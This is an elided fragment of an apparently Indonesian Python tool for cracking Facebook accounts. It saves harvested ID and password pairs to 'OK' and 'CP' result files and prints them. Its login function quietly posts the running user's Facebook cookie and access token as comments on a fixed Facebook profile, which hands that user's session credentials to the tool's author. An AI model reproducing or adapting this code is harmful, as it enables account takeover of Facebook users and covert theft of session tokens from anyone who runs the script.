...
Tajul_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
Tajul_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
...
def login():
	...
	try:
		...
		link = ('https://www.facebook.com/profile.php?id=100072425385396/posts/100072425385396/?flite=scwspnss')
		...
		ses.post(f"https://www.facebook.com/profile.php?id=100072425385396/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://www.facebook.com/profile.php?id=100072425385396/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://www.facebook.com/profile.php?id=100072425385396/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
...
def cek_akun():
	...
	xxx = input(' Tajulpan akun tidak kenon ke file apa : \n nama : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
				...
				if data in rescp:pass
					...
					if 'ya' in cepeh:
						...
						try:
							...
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+Tajul_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\n [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n')
							#os.popen('play-audio data/cepe.mp3')
							open('CP/'+Tajul_cp,'a').write(idf+'|'+pw+'\n')
							break
...
def cek_opsi(idf,pw,ua):
	...
	try:
		...
		else:open('CP/'+Tajul_cp,'a').write(mek+'\n')
	except:
		month = ""
		day = ""
		year = ""
		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}'
		if 'file' in detek:pass
		else:open('CP/'+Tajul_cp,'a').write(idf+'|'+pw+'\n')
	try:
